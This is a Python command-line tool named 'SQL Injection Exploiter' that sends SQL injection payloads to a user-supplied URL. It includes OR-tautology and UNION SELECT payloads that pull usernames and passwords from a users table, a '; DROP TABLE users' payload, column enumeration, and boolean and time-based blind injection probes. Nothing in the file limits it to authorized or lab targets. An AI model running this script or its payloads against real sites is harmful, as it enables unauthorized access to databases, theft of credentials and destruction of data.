import requests  # Import the requests library to send HTTP requests
import urllib.parse  # Import urllib for URL encoding
import argparse  # Import argparse for command-line argument parsing
import time  # Import time for delay in time-based injections
from colorama import Fore, Style, init  # Import colorama for colored text output

# Initialize colorama for coloring output in the terminal
init(autoreset=True)

# Expanded list of OR-based payloads for SQL injection
ORpayloads = [
    "' OR 1=1-- ",  # Always true
    "' OR '1'='1'-- ",  # Always true with string
    "' OR 1=1# ",  # Hash comment style
    "' OR '1'='1'/* ",  # Comment style
    "' OR EXISTS(SELECT * FROM users)-- ",  # Check if users table exists
    "' OR 1=(SELECT COUNT(*) FROM information_schema.tables)-- ",  # Count tables
    "' OR (SELECT 1 FROM dual)-- ",  # Dummy select
    "' OR 'a'='a'-- ",  # Simple tautology
    "' OR 1=2 UNION SELECT username, password FROM users-- ",  # Union select example
    "' OR (SELECT user() UNION SELECT database())-- ",  # Fetching current user and database
    "' OR (SELECT NULL FROM dual)-- ",  # Dummy query
    "' OR 1=2 UNION SELECT NULL, NULL, NULL-- ",  # Simple union with nulls
    "' OR (SELECT COUNT(*) FROM (SELECT 1) as a)-- ",  # Nested select
    "' OR (SELECT COUNT(*) FROM users WHERE '1'='1')-- ",  # Conditional based on users count
    "' OR (SELECT 1 AND 1)-- ",  # Simple boolean logic
    # Additional OR payloads
    "' OR 1=1;-- ",  # Standard OR payload with semicolon
    "' OR ''='';-- ",  # Empty string comparison
    "' OR 1=1 LIMIT 1;-- ",  # OR payload with LIMIT clause
    "' OR 1=1 UNION ALL SELECT NULL, NULL;-- ",  # UNION SELECT with NULL values
    "' OR 1=1 AND 1=1;-- ",  # OR combined with AND payload
    "' OR 'abc'='abc';-- ",  # OR with string comparison
    "' OR 1=1 WAITFOR DELAY '0:0:10';-- ",  # OR payload combined with delay (time-based)
    "' OR 1=1; DROP TABLE users;-- ",  # Dangerous payload to drop table
    "' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema = database() LIMIT 1);-- ",  # Test for existing tables


    
    " OR 1=1-- ",  # Always true
    " OR '1'='1'-- ",  # Always true with string
    " OR 1=1# ",  # Hash comment style
    " OR '1'='1'/* ",  # Comment style
    " OR EXISTS(SELECT * FROM users)-- ",  # Check if users table exists
    " OR 1=(SELECT COUNT(*) FROM information_schema.tables)-- ",  # Count tables
    " OR (SELECT 1 FROM dual)-- ",  # Dummy select
    " OR 'a'='a'-- ",  # Simple tautology
    " OR 1=2 UNION SELECT username, password FROM users-- ",  # Union select example
    " OR (SELECT user() UNION SELECT database())-- ",  # Fetching current user and database
    " OR (SELECT NULL FROM dual)-- ",  # Dummy query
    " OR 1=2 UNION SELECT NULL, NULL, NULL-- ",  # Simple union with nulls
    " OR (SELECT COUNT(*) FROM (SELECT 1) as a)-- ",  # Nested select
    " OR (SELECT COUNT(*) FROM users WHERE '1'='1')-- ",  # Conditional based on users count
    " OR (SELECT 1 AND 1)-- ",  # Simple boolean logic
    " OR 1=1;-- ",  # Standard OR payload with semicolon
    " OR ''='';-- ",  # Empty string comparison
    " OR 1=1 LIMIT 1;-- ",  # OR payload with LIMIT clause
    " OR 1=1 UNION ALL SELECT NULL, NULL;-- ",  # UNION SELECT with NULL values
    " OR 1=1 AND 1=1;-- ",  # OR combined with AND payload
    " OR 'abc'='abc';-- ",  # OR with string comparison
    " OR 1=1 WAITFOR DELAY '0:0:10';-- ",  # OR payload combined with delay (time-based)
    " OR 1=1; DROP TABLE users;-- ",  # Dangerous payload to drop table
    " OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema = database() LIMIT 1);-- ",  # Test for existing tables

]

# Base payload for ORDER BY injection to find the number of columns
ORDERpayload_base = "' ORDER BY "  # Will be used to append column numbers for ORDER BY tests

# Expanded list of time-based SQL injection payloads
time_based_payloads = [
    "'; WAITFOR DELAY '0:0:5'-- ",  # Delay for 5 seconds
    "'; IF(1=1, SLEEP(5), 0)-- ",  # Sleep for 5 seconds if condition is true
    "'; IF(ASCII(SUBSTRING((SELECT @@version), 1, 1)) > 0, SLEEP(5), 0)-- ",  # Conditional sleep based on version string
    "' AND IF(1=1, BENCHMARK(10000000,MD5('test')),0)-- ",  # Benchmark-based delay (MySQL)
    "'; SELECT IF(1=1, SLEEP(5), 0)-- ",  # Sleep based on condition
    "'; SELECT SLEEP(5)-- ",  # Simple sleep
    "' AND IF(1=1, SLEEP(5), SLEEP(0))-- ",  # Sleep if condition is true
    "'; IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)-- ",  # Delay if users table exists
    "' OR IF((SELECT LENGTH(database()))>0, SLEEP(5), 0)-- ",  # Sleep if the database exists
    "' AND IF((SELECT LENGTH(TABLE_NAME) FROM information_schema.tables LIMIT 1)>0, SLEEP(5), 0)-- ",  # Sleep based on table length
]

# Function to test SQL injection using OR-based payloads
def or_injection(url):
    print(Fore.CYAN + "Trying error-based injection with OR payloads...\n")
    
    # Loop through each OR payload
    for payload in ORpayloads:
        # URL encode the payload and append it to the base URL
        target_url = url + urllib.parse.quote(payload)
        
        print(Fore.YELLOW + f"Testing: {target_url}\n")
        
        # Send the request to the target URL with the payload
        r = requests.get(target_url)
        
        # Check the response status code to see if the payload was successful
        if r.status_code == 200:
            print(Fore.GREEN + f"Payload: '{payload}' worked! Status code: 200\n")
        else:
            print(Fore.RED + f"Payload: '{payload}' failed. Status code: {r.status_code}\n")
    
    print(Fore.MAGENTA + "***************************\n")  # Separator for OR injection output

# Function to test for error-based SQL injection
def error_based_injection(url):
    print(Fore.CYAN + "Testing for error-based SQL injection...\n")
    
    # Payload that typically causes an error
    error_payload = "' AND 1=CONVERT(int, (SELECT @@version))-- "
    target_url = url + urllib.parse.quote(error_payload)
    
    print(Fore.YELLOW + f"Testing: {target_url}\n")
    
    # Send the request to the target URL with the error payload
    r = requests.get(target_url)
    
    # Check for common SQL error messages in the response
    if r.status_code == 200 and "error" in r.text.lower():
        print(Fore.GREEN + "Error-based SQL injection is possible!\n")
    else:
        print(Fore.RED + "Error-based SQL injection is not possible.\n")

    print(Fore.MAGENTA + "***************************\n")  # Separator for error-based injection output

# Function to determine the number of columns using the ORDER BY clause
def order_injection(url):
    print(Fore.CYAN + "Trying to determine the number of columns using ORDER BY...\n")
    
    # Loop to test different numbers of columns, starting from 1 to 50
    for i in range(1, 50):
        # Construct the ORDER BY payload by appending the column number to the base payload
        query = ORDERpayload_base + str(i) + "--"
        
        # URL encode the payload and append it to the base URL
        target_url = url + urllib.parse.quote(query)
        
        print(Fore.YELLOW + f"Testing: {target_url}\n")
        
        # Send the request to the target URL with the ORDER BY payload
        r = requests.get(target_url)
        
        # If the status code is 200, the current column number is valid
        if r.status_code == 200:
            print(Fore.GREEN + f"Column {i} is valid.\n")
        else:
            # If the status code is not 200, it indicates that the previous column number was valid
            print(Fore.GREEN + f"Total number of columns found: {i - 1}\n")
            return i - 1  # Return the number of columns before the failure

    print(Fore.MAGENTA + "***************************\n")  # Separator for ORDER BY output

# Function to determine the number of columns using a NULL-based injection
def null_injection(url):
    print(Fore.CYAN + "Trying to determine the number of columns using NULL-based injection...\n")
    
    # Loop to test different numbers of NULLs, starting from 1 to 50
    for i in range(1, 50):
        # Create a payload with i number of NULLs
        query = "NULL," * i  # Repeat 'NULL,' i times
        query = query[0:-1]  # Remove the trailing comma
        
        # Send the request with the UNION SELECT NULL, NULL,... payload
        r = requests.get(url + "' UNION SELECT " + query + "-- ")
        
        # If the status code is 500, it indicates a server error (likely due to the wrong number of columns)
        if r.status_code == 500:
            print(Fore.RED + f"Column {i} gave 500 internal error.\n")
        
        # If the status code is 200, it indicates a successful query with the correct number of columns
        elif r.status_code == 200:
            print(Fore.GREEN + f"Total number of columns are {i}\n")
            return i  # Return the correct number of columns

    print(Fore.MAGENTA + "***************************\n")  # Separator for NULL injection output
    return None  # Return None if no valid number of columns is found

# Function to detect the data type of each column
def detect_column_types(url, num_columns):
    print(Fore.CYAN + f"Detecting the data types of {num_columns} columns...\n")
    
    # Loop through each column to test its type
    for i in range(1, num_columns + 1):
        # Create payloads to test for string, integer, and date data types in each column
        payloads = [
            f"' UNION SELECT {','.join(['NULL'] * (i-1))}, 'a', {','.join(['NULL'] * (num_columns - i))}-- ",  # String test
            f"' UNION SELECT {','.join(['NULL'] * (i-1))}, 1, {','.join(['NULL'] * (num_columns - i))}-- ",  # Integer test
            f"' UNION SELECT {','.join(['NULL'] * (i-1))}, NOW(), {','.join(['NULL'] * (num_columns - i))}-- ",  # Date test
        ]
        
        # Send the requests and check which data type works in each column
        for payload in payloads:
            print(Fore.YELLOW + f"Testing column {i} with payload: {payload}\n")
            r = requests.get(url + urllib.parse.quote(payload))
            
            # If the response status code is 200, the current data type is valid
            if r.status_code == 200:
                print(Fore.GREEN + f"Column {i} is of type {payload}\n")
                break

    print(Fore.MAGENTA + "***************************\n")  # Separator for column type detection output

# Function to perform boolean-based blind SQL injection
def boolean_blind_sql_injection(url):
    print(Fore.CYAN + "Testing for boolean-based blind SQL injection...\n")
    
    # Construct boolean-based payloads for true and false
    true_payload = "' AND 1=1-- "
    false_payload = "' AND 1=2-- "
    
    # Send the request with the true payload
    r_true = requests.get(url + urllib.parse.quote(true_payload))
    r_false = requests.get(url + urllib.parse.quote(false_payload))
    
    # Compare the response times and status codes to infer the result
    if r_true.status_code == 200 and r_false.status_code == 200 and r_true.text != r_false.text:
        print(Fore.GREEN + "Boolean-based blind SQL injection is possible!\n")
    else:
        print(Fore.RED + "Boolean-based blind SQL injection is not possible.\n")
    
    print(Fore.MAGENTA + "***************************\n")  # Separator for boolean-based blind injection output

# Function to perform blind SQL injection using time-based technique
def time_based_blind_sql_injection(url):
    print(Fore.CYAN + "Testing for time-based blind SQL injection...\n")
    
    # Loop through the expanded list of time-based payloads
    for payload in time_based_payloads:
        # Measure the response time for the payload
        start_time = time.time()  # Record the start time
        r = requests.get(url + urllib.parse.quote(payload))  # Send the request with the time-based payload
        duration = time.time() - start_time  # Calculate the response time
        
        print(Fore.YELLOW + f"Testing payload: {payload}\n")
        
        # Check if the response time indicates a successful injection
        if duration > 4:
            print(Fore.GREEN + f"Time-based blind SQL injection is possible with payload: '{payload}'. Response time: {duration:.2f} seconds\n")
        else:
            print(Fore.RED + f"Time-based blind SQL injection failed with payload: '{payload}'. Response time: {duration:.2f} seconds\n")
    
    print(Fore.MAGENTA + "***************************\n")  # Separator for time-based blind injection output

# Main function to parse command-line arguments and run the SQL injection tests
def main():
    # Create an argument parser to handle command-line arguments
    parser = argparse.ArgumentParser(description="SQL Injection Exploiter")
    
    # Add an argument for the target URL
    parser.add_argument("url", help="Target URL")
    
    # Parse the arguments
    args = parser.parse_args()
    
    # Call the OR-based injection function to test for SQL injection
    or_injection(args.url)
    
    # Call the error-based injection function to test for error-based SQL injection
    error_based_injection(args.url)
    
    # Call the order injection function to test for the number of columns
    num_columns = order_injection(args.url)
    
    # If the number of columns is found, call the column type detection function
    if num_columns:
        detect_column_types(args.url, num_columns)
    
    # Call the boolean-based blind injection function to test for boolean-based blind SQL injection
    boolean_blind_sql_injection(args.url)
    
    # Call the time-based blind injection function to test for time-based blind SQL injection
    time_based_blind_sql_injection(args.url)

# Run the main function if the script is executed directly
if __name__ == "__main__":
    main()
